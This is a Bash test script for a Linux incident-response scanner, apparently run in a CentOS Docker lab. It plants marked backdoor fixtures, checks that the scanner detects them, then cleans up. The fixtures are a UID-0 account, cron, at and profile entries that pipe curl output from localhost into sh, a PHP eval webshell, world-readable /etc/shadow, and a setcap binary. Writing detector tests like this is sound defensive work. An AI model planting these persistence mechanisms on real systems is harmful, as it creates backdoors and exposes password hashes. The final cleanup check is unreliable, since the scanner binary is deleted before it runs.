#!/usr/bin/env bash
# centos-ir-lab 测试台：真实 CentOS7 DVD 级环境（httpd/sshd/crond/rsyslogd）
# 夹具全部 ctfir-marker 前缀；结束清理并复验。用法: fixture_builder_centos.sh <linux_ctfir_path>
set -uo pipefail
BIN_HOST="$1"   # 宿主侧静态二进制（docker cp 进容器）
C=centos-ir-lab
pass=0; fail=0
ok()  { pass=$((pass+1)); echo "[PASS] $1"; }
bad() { fail=$((fail+1)); echo "[FAIL] $1"; }
ex()  { docker exec "$C" bash -c "$1" 2>&1; }

docker start "$C" >/dev/null 2>&1
# 拉起服务（用户 enter.sh 同款逻辑）
ex 'pgrep -x crond >/dev/null || crond; pgrep -x rsyslogd >/dev/null || rsyslogd; pgrep -x sshd >/dev/null || /usr/sbin/sshd; pgrep -x httpd >/dev/null || httpd -k start' >/dev/null
docker cp "$BIN_HOST" "$C:/tmp/ctfir" >/dev/null
ex 'chmod +x /tmp/ctfir' >/dev/null

echo "=== 阶段1：负例（centos-ir-lab 原生状态）==="
ex 'rm -rf /tmp/ctfir-out-neg && /tmp/ctfir scan --out /tmp/ctfir-out-neg >/dev/null 2>&1; echo exit=$?'
NEG=$(ex 'cat /tmp/ctfir-out-neg/findings.json')
echo "$NEG" | grep -q "ctfir-marker" && bad "干净环境出现 marker（不可能）" || ok "干净环境无 marker"
# 记录原生命中（负例语料）
ex 'cat /tmp/ctfir-out-neg/findings.json' | grep -o '"rule_id": "[A-Z0-9.]*"' | sort | uniq -c | tee /d/ctfir-build/centos-native-findings.txt

echo "=== 阶段2：正例夹具（ctfir-marker 前缀）==="
ex '
echo "ctfir-marker:x:0:0:marker:/tmp:/bin/sh" >> /etc/passwd
echo "* * * * * root curl http://127.0.0.1/ctfir-marker | sh" > /etc/cron.d/ctfir-marker
echo "127.0.0.1 ctfir-marker.invalid # ctfir-marker" >> /etc/hosts
echo "alias ls=\"curl http://127.0.0.1/ctfir-marker | sh\"" > /etc/profile.d/ctfir-marker.sh
mkdir -p /var/www/html /var/log/httpd /etc/systemd/system /var/spool/at
printf "<?php eval(\$_POST[cmd]); ?>\n" > /var/www/html/ctfir-marker.php
for i in $(seq 1 60); do echo "10.99.99.99 - - [08/Nov/2026:10:00:00 +0800] \"POST /ctfir-marker.php HTTP/1.1\" 200 -" >> /var/log/httpd/access_log; done
printf "[Timer]\nOnCalendar=*\n" > /etc/systemd/system/ctfir-marker.timer
echo "curl http://127.0.0.1/ctfir-marker | sh" > /var/spool/at/ctfir-marker
chmod o+r /etc/shadow
cp /bin/true /usr/bin/ctfir-marker-cap && setcap cap_net_raw+ep /usr/bin/ctfir-marker-cap 2>/dev/null
# 基线用例：两文件一改一原
mkdir -p /tmp/ctfir-baseline
echo original-one > /tmp/ctfir-baseline/a.txt
echo original-two > /tmp/ctfir-baseline/b.txt
SHA_A=$(sha256sum /tmp/ctfir-baseline/a.txt | cut -d" " -f1)
SHA_B=$(sha256sum /tmp/ctfir-baseline/b.txt | cut -d" " -f1)
printf "/tmp/ctfir-baseline/a.txt %s\n/tmp/ctfir-baseline/b.txt %s\n" "$SHA_A" "$SHA_B" > /tmp/ctfir-baseline.list
echo modified-one > /tmp/ctfir-baseline/a.txt
true'

echo "=== 阶段3：扫描（root + --baseline）==="
ex 'rm -rf /tmp/ctfir-out-pos && /tmp/ctfir scan --out /tmp/ctfir-out-pos --baseline /tmp/ctfir-baseline.list --dir /tmp/ctfir-baseline >/dev/null 2>&1; echo exit=$?'
RES=$(ex 'cat /tmp/ctfir-out-pos/findings.json')
echo "$RES" | grep -q "LNX.ACC.UID0.001"            && ok "UID0 命中"            || bad "UID0 漏检"
echo "$RES" | grep -q "LNX.PERSIST.CRON.001"        && ok "cron 命中"            || bad "cron 漏检"
echo "$RES" | grep -q "LNX.HOSTS.LOOPBACK.001"      && ok "hosts 回环命中"       || bad "hosts 回环漏检"
echo "$RES" | grep -q "LNX.PERSIST.PROFILE.001"     && ok "profile 命中"         || bad "profile 漏检"
echo "$RES" | grep -q "LNX.WEB.SHELL.001"           && ok "webshell 命中"        || bad "webshell 漏检"
echo "$RES" | grep -q "LNX.WEB.LOGPOST.001"         && ok "POST Top IP 命中"     || bad "日志漏检"
EV=$(ex 'cat /tmp/ctfir-out-pos/evidence.json')
echo "$EV" | grep -q "10.99.99.99"                  && ok "Top IP 正确（evidence）" || bad "Top IP 错误"
echo "$RES" | grep -q "LNX.TIMER.FACT.001"          && ok "timer 事实化"         || bad "timer 漏检"
echo "$RES" | grep -q "LNX.PERSIST.AT.001"          && ok "at 命中"              || bad "at 漏检"
echo "$RES" | grep -q "LNX.ACC.SHADOWPERM.001"      && ok "shadow 权限命中"      || bad "shadow 漏检"
echo "$RES" | grep -q "LNX.CAPS.UNEXPECTED.001"     && ok "caps 命中"            || bad "caps 漏检（无 setcap 则跳过）"
echo "$RES" | grep -q "LNX.FILES.BASELINE.001" && ok "基线 mismatch 命中" || bad "基线漏检"
echo "$RES" | grep -q "ADVICE"                      && ok "建议挂接"             || bad "建议缺失"

echo "=== 阶段4：清理并复验 ==="
ex '
sed -i "/ctfir-marker/d" /etc/passwd /etc/hosts /var/log/httpd/access_log 2>/dev/null
rm -f /etc/cron.d/ctfir-marker /etc/profile.d/ctfir-marker.sh /etc/systemd/system/ctfir-marker.timer \
      /var/spool/at/ctfir-marker /var/www/html/ctfir-marker.php /usr/bin/ctfir-marker-cap /tmp/ctfir
chmod 000 /etc/shadow 2>/dev/null; chmod 640 /etc/shadow 2>/dev/null
chmod og-rwx /etc/shadow
rm -rf /tmp/ctfir-out-neg /tmp/ctfir-out-pos /tmp/ctfir-baseline /tmp/ctfir-baseline.list
true'
RES2=$(ex 'rm -rf /tmp/ctfir-out-clean; /tmp/ctfir scan --out /tmp/ctfir-out-clean >/dev/null 2>&1; cat /tmp/ctfir-out-clean/findings.json')
echo "$RES2" | grep -q "ctfir-marker" && bad "清理后残留" || ok "清理复验通过"
ex 'rm -rf /tmp/ctfir-out-clean; rm -f /tmp/ctfir' >/dev/null
docker stop "$C" >/dev/null 2>&1

echo "=== 结果: pass=$pass fail=$fail ==="
[ "$fail" -eq 0 ]
